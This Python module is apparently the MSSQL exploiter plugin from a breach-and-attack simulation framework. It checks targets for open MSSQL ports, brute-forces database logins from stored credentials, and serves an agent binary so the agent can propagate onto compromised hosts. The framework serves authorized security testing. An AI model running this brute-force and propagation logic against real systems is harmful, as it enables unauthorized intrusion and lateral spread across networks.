import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence

# common imports
from common.credentials import Password, Username
from common.event_queue import IAgentEventPublisher
from common.types import AgentID, Event, NetworkPort, NetworkService
from common.utils.code_utils import del_key

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository, IAgentOTPProvider
from infection_monkey.exploit.tools import (
    any_tcp_port_status_is_unknown,
    generate_brute_force_credentials,
    get_open_tcp_ports,
    identity_type_filter,
    secret_type_filter,
)
from infection_monkey.exploit.tools.http_agent_binary_server import start_agent_binary_server
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.network import TCPPortSelector
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .mssql_exploiter import MSSQLExploiter
from .mssql_client import MSSQLClient
from .mssql_exploit_client import MSSQLExploitClient
from .mssql_options import MSSQLOptions

logger = logging.getLogger(__name__)


def should_attempt_exploit(host: TargetHost, target_ports: Sequence[NetworkPort]) -> bool:
    relevant_tcp_ports_on_host = get_open_tcp_ports(
        host=host, services_to_filter={NetworkService.MSSQL, NetworkService.UNKNOWN}
    )
    open_target_port_on_host_exists = any(
        [port in relevant_tcp_ports_on_host for port in target_ports]
    )

    return open_target_port_on_host_exists or any_tcp_port_status_is_unknown(host, target_ports)


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        tcp_port_selector: TCPPortSelector,
        otp_provider: IAgentOTPProvider,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        self._propagation_credentials_repository = propagation_credentials_repository
        self._tcp_port_selector = tcp_port_selector
        self._otp_provider = otp_provider

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            mssql_options = MSSQLOptions(**options)
        except Exception as err:
            msg = f"Failed to parse MSSQL options: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        if not should_attempt_exploit(host, mssql_options.target_ports):
            msg = f"Host {host.ip} has no open MSSQL ports"
            logger.debug(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        try:
            logger.debug(f"Running MSSQL exploiter on host {host.ip}")
            brute_force_credentials = generate_brute_force_credentials(
                self._propagation_credentials_repository.get_credentials(),
                identity_filter=identity_type_filter([Username]),
                secret_filter=secret_type_filter([Password]),
            )
            agent_binary_server_factory = partial(
                start_agent_binary_server,
                agent_binary_repository=self._agent_binary_repository,
                tcp_port_selector=self._tcp_port_selector,
            )

            mssql_client = MSSQLClient(mssql_options.server_timeout)

            mssql_exploit_client = MSSQLExploitClient(
                exploiter_name=self._plugin_name,
                agent_id=self._agent_id,
                agent_event_publisher=self._agent_event_publisher,
                mssql_client=mssql_client,
            )

            mssql_exploiter = MSSQLExploiter(
                self._agent_id,
                mssql_exploit_client,
                agent_binary_server_factory,
                self._otp_provider,
            )
            return mssql_exploiter.exploit_host(
                host, mssql_options, servers, current_depth, brute_force_credentials, interrupt
            )
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
